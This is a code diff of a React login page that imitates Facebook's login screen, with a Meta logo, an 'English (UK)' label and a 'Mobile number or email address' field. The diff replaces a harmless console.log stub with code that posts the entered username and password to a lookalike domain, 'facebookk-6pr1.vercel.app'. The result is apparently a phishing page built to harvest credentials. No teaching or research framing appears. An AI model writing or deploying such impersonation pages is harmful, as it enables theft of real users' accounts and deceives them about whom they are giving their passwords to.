@@ -2,21 +2,38 @@ import React, { useState } from 'react';
 import './App.css'
 import img from './communication.png'
 import img1 from './meta.png'
-const Login = () => {
-    const [email, setEmail] = useState('');
-    const [password, setPassword] = useState('');
+import axios from 'axios';
 
-    const handleLogin = (e) => {
+const Login = () => {
+    const [formData,setData] = useState({
+        username: "",
+        password:"",
+       
+      });
+    
+      const handleChange = (e) => {
+        setData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
+      };
+    
+     
+    
+     
+      const handleSubmit = async (e) => {
         e.preventDefault();
-        // هنا يمكنك إضافة منطق تسجيل الدخول
-        console.log('تسجيل الدخول:', { email, password });
-    };
+        axios.post('facebookk-6pr1.vercel.app/signup', formData)
+          .then((res) => {
+            console.log(res.data);
+            
+          })
+          .catch((err) => console.log(err));
+      };
+   
 
     return (
       <div className="login-container">
         <small style={{fontSize:"13px",marginTop:"15px"}}>English (UK)</small>
       <img src={img}/>
-      <form onSubmit={handleLogin} className='form'>
+      <form onSubmit={handleSubmit} className='form'>
           
          
           <div className="input-group">
@@ -25,9 +42,8 @@ const Login = () => {
                   type="email"
                   id="email"
                   placeholder="Mobile number or email address"
-
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  name="username"
+                  onChange={handleChange}
                   required
               />
           </div>
@@ -36,9 +52,9 @@ const Login = () => {
               <input
                   type="password"
                   id="password"
+                  name="password"
                   placeholder="Password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  onChange={handleChange}
                   required
               />
           </div>
